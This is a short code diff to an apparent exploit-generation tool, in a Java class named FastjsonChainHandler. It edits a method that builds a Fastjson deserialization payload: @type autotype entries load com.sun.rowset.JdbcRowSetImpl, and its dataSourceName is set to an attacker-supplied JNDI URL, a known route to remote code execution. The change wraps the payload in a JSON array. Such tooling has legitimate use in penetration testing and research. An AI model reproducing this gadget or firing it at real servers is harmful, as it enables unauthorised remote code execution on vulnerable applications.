@@ -51,10 +51,10 @@ public class FastjsonChainHandler implements ChainHandler {
 
     private String jdbcRowSetV2Json(String jndiUrl) {
         return String.format(
-            "{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
+            "[{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}," +
             "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
             "\"dataSourceName\":\"%s\"," +
-            "\"autoCommit\":true}", jsonEsc(jndiUrl));
+            "\"autoCommit\":true}]", jsonEsc(jndiUrl));
     }
 
     /**
